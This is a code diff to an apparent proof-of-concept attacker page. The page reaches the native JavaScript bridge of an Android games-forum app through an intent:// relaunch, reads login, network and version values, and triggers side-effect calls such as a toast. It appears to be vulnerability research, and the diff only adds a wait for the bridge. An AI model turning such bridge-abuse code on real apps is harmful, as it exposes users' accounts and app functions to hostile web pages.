@@ -64,17 +64,25 @@
   function show(id){ var e = document.getElementById(id); if (e) e.setAttribute('display', 'inline'); }
   function on(id, fn){ var e = document.getElementById(id); if (e) e.addEventListener('click', fn); }
 
+  /* 桥（appJsBridge）由原生在页面加载后异步注入；轮询等待（最多 ~5s），避免过早取值拿到 NO_appJsBridge */
+  function whenBridge(cb){
+    var n = 0;
+    (function poll(){ if (window.appJsBridge || n > 25) { cb(); return; } n++; setTimeout(poll, 200); })();
+  }
+
   log('href', location.href);
   log('stage', stage);
 
   if (stage === 1) {
-    /* ---- hop1：只读取值 + 显示按钮（不自动二跳） ---- */
+    /* ---- hop1：等桥就绪后只读取值 + 显示按钮（不自动二跳） ---- */
+    whenBridge(function(){
     log('appJsBridge', typeof window.appJsBridge);
     log('prompt.getEnv.isLogin', promptCall('getEnv', {key: 'isLogin'}));
     log('prompt.getEnv.network', promptCall('getEnv', {key: 'network'}));
     log('prompt.getEnv.apkversion', promptCall('getEnv', {key: 'apkversion'}));
     log('ready', 'tap the blue button to advance');
     show('btn1');
+    });
     on('btn1', function(){
       var self = location.href.split('#')[0].split('?')[0];
       var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
@@ -84,7 +92,8 @@
       try { location.href = it; } catch(e){ log('intent_ERR', e); }
     });
   } else {
-    /* ---- hop2：只读全表（不自动调用有副作用的动作） ---- */
+    /* ---- hop2：等桥就绪后只读全表（不自动调用有副作用的动作） ---- */
+    whenBridge(function(){
     log('appJsBridge', typeof window.appJsBridge);
     log('getBrand', jsapi('getBrand'));
     log('isLogin', jsapi('isLogin'));
@@ -96,6 +105,7 @@
     log('checkNeedDownload', jsapi('checkIfNeedDownloadOrUpdate', {pkg: 'com.android.settings', version: 1}));
     log('ready', 'read-only done; tap a button for side-effect calls');
     show('btn2'); show('btn3');
+    });
     on('btn2', function(){
       log('showToast', jsapi('showToast', {text: 'POC: attacker page called GamesJS', duration: 1}));
     });
